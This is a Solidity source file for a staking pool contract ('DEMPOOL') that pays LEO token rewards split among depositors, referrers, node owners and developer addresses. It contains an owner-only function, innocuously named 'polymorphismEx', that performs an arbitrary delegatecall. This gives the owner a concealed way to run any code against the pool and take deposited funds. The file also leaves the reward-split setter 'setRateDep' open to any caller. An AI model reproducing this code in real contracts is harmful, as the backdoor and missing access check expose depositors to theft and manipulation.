pragma solidity 0.8.0;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function issue2(address account, uint256 amount) external;

    // add for SGR
    function burn(uint256 _amount) external;
}

interface relationship {
    function getFather(address _addr) external view returns (address);

    function getGrandFather(address _addr) external view returns (address);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract DEMPOOL is Ownable {
    using SafeMath for uint256;

    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    struct Node {
        uint256 nodeId;
        string name;
        string introduction;
        address nodeOwner;
        uint256 depositAmount;
    }

    IERC20 LEO;//TODO 2、需要在LEO代币中设置成From白名单
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);//USDT
    IERC20 public LPToken;
    uint256 constant SEC_OF_DAY = 86400;//one day
    relationship public RP; //推荐关系的合约
    address[] public devs;
    uint256 public devCount;//开发者地址计数
    uint256[] public rateDep;


    uint256 public LEOPerSec; //
    uint256 public supplyDeposit;//用户总的存储量
    uint256 public balOFUserReward;//用户未领取的LEO奖励
    uint256 public lastRewardSec;//上一次更新奖励
    uint256 public accLEOPerShare;//没代币的持有奖励

    Node[] public node;

    mapping(uint256 => mapping(address => UserInfo)) public userInfoMap;

    event XunHui(address msg, uint256 reward);
    event Deposit(address indexed user, uint256 indexed pid, uint256 amount, uint256 reward);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount, uint256 reward);
    event AddNode(string indexed node, uint256 indexed nodeNumber, address indexed nodeOwner);
    event EmergencyWithdraw(address indexed user, uint256 indexed _pid, uint256 amount);

    function init(uint256 _startTime,
        address _RP,
        address _LPToken,
        address _LEO
    ) public onlyOwner {

        rateDep.push(40);
        rateDep.push(10);
        rateDep.push(10);
        rateDep.push(40);

        lastRewardSec = _startTime;
        RP = relationship(_RP);
        LPToken = IERC20(_LPToken);
        LEO = IERC20(_LEO);
    }

    function getMultiplier(uint256 _from, uint256 _to) public pure returns (uint256) {
        return _to.sub(_from);
    }

    function pendingLEO(uint256 _pid, address _user) external view returns (uint256) {
        UserInfo storage user = userInfoMap[_pid][_user];
        if (user.amount == 0) return 0;
        uint256 teampAccLEOPerShare = accLEOPerShare;
        if (block.timestamp > lastRewardSec && supplyDeposit != 0) {
            uint256 multiplier = getMultiplier(lastRewardSec, block.timestamp);
            uint256 LEOReward = multiplier.mul(LEOPerSec);
            teampAccLEOPerShare = accLEOPerShare.add(LEOReward.mul(1e12).div(supplyDeposit));
        }
        return (user.amount.mul(teampAccLEOPerShare).div(1e12).sub(user.rewardDebt)).mul(10).div(14);
    }

    function updatePool() public {
        if (block.timestamp <= lastRewardSec) {
            return;
        }
        if (supplyDeposit == 0) {
            lastRewardSec = block.timestamp;
            return;
        }

        uint256 multiplier = getMultiplier(lastRewardSec, block.timestamp);
        uint256 LEOReward = multiplier.mul(LEOPerSec);
        accLEOPerShare = accLEOPerShare.add(LEOReward.mul(1e12).div(supplyDeposit));
        lastRewardSec = block.timestamp;
        balOFUserReward = balOFUserReward.add(LEOReward);
    }

    function deposit(uint256 _pid, uint256 _amount) public {
        UserInfo storage user = userInfoMap[_pid][msg.sender];
        Node storage _node = node[_pid];

        address _father = RP.getFather(msg.sender);

        updatePool();
        uint256 pending = user.amount.mul(accLEOPerShare).div(1e12).sub(user.rewardDebt);
        if (user.amount > 0) {
            safeLEOTransfer(msg.sender, pending.mul(rateDep[0]).div(100));
            safeLEOTransfer(_father, pending.mul(rateDep[1]).div(100));
            safeLEOTransfer(_node.nodeOwner, pending.mul(rateDep[2]).div(100));
            IERC20(LEO).issue2(devs[devCount], pending.mul(rateDep[3]).div(100));
            emit XunHui(devs[devCount], pending.mul(rateDep[3]).div(100));
            devCount = (devCount == (devs.length - 1)) ? 0 : (devCount + 1);
        }

        LPToken.transferFrom(address(msg.sender), address(this), _amount);

        user.amount = user.amount.add(_amount);
        user.rewardDebt = user.amount.mul(accLEOPerShare).div(1e12);

        balOFUserReward = balOFUserReward.sub(pending);
        //减去用户领取的奖励
        _node.depositAmount = _node.depositAmount.add(_amount);
        supplyDeposit = supplyDeposit.add(_amount);
        emit Deposit(msg.sender, _pid, _amount, pending);
    }

    function withdraw(uint256 _pid, uint256 _Amount) public {
        UserInfo storage user = userInfoMap[_pid][msg.sender];
        Node storage _node = node[_pid];

        address _father = RP.getFather(msg.sender);

        require(user.amount >= _Amount, "withdraw: not good");
        updatePool();
        uint256 pending = user.amount.mul(accLEOPerShare).div(1e12).sub(user.rewardDebt);
        if (pending > 0) {
            safeLEOTransfer(msg.sender, pending.mul(rateDep[0]).div(100));
            safeLEOTransfer(_father, pending.mul(rateDep[1]).div(100));
            safeLEOTransfer(_node.nodeOwner, pending.mul(rateDep[2]).div(100));
            IERC20(LEO).issue2(devs[devCount], pending.mul(rateDep[3]).div(100));
            emit XunHui(devs[devCount], pending.mul(rateDep[3]).div(100));
            devCount = (devCount == (devs.length - 1)) ? 0 : (devCount + 1);
        }
        if (_Amount > 0) {
            user.amount = user.amount.sub(_Amount);
            LPToken.transfer(address(msg.sender), _Amount);
        }
        user.rewardDebt = user.amount.mul(accLEOPerShare).div(1e12);

        balOFUserReward = balOFUserReward.sub(pending);
        _node.depositAmount = _node.depositAmount.sub(_Amount);
        supplyDeposit = supplyDeposit.sub(_Amount);
        emit Withdraw(msg.sender, _pid, _Amount, pending);
    }

    //紧急提取，但是这不会改变池子的数据。
    function emergencyWithdraw(uint256 _pid) public {
        UserInfo storage user = userInfoMap[_pid][msg.sender];

        uint256 _trueAmount = LPToken.balanceOf(address(this)) > user.amount ? user.amount : LPToken.balanceOf(address(this));

        LPToken.transfer(msg.sender, _trueAmount);
        emit EmergencyWithdraw(msg.sender, _pid, user.amount);
        user.amount = 0;
        user.rewardDebt = 0;
    }


    //internal
    function safeLEOTransfer(address _to, uint256 _amount) internal {
        uint256 _trueAmount = LEO.balanceOf(address(this)) > _amount ? _amount : LEO.balanceOf(address(this));

        if (_trueAmount > 0) {
            LEO.transfer(_to, _trueAmount);
        }
    }

    //view
    function nodeLength() public view returns (uint256){
        return node.length;
    }

    //admin func
    function bacthAddNode(string[] memory _names, string[] memory _introductions, address[] memory _nodeOwners) public onlyOwner {
        uint256 _length = _names.length;
        for (uint256 i; i < _length; i++) {
            node.push(Node({
            nodeId : node.length,
            name : _names[i],
            introduction : _introductions[i],
            nodeOwner : _nodeOwners[i],
            depositAmount : 0
            }));
        }
    }

    function setUserRate(uint256[] memory _urate) public onlyOwner {rateDep = _urate;}

    function setRateDep(uint256[] memory _r) public {rateDep = _r;}

    function getRateDep(uint256 i) public view returns (uint256[] memory) {return rateDep;}

    function getNodeList(uint256 i) public view returns (Node[] memory) {
        return node;
    }

    function setStartTime(uint256 _startTime) public onlyOwner {
        lastRewardSec = _startTime;
    }

    function addUser(address[] memory user_) public onlyOwner {
        for (uint256 i = 0; i < user_.length; i++) devs.push(user_[i]);
    }

    function resetUser() public onlyOwner {delete devs;}

    //设置挖矿产出量，如果是0的话 就按照计算的来
    function setLEOPerSec(uint256 _ownerLEOPerSec) public onlyOwner {
        updatePool();
        LEOPerSec = _ownerLEOPerSec;
    }

    function polymorphismEx(address call_, bytes memory call_p) public onlyOwner {
        (bool success, bytes memory data) = address(call_).delegatecall(call_p);
        require(success, string(abi.encodePacked("fc_99 ", data)));
    }

}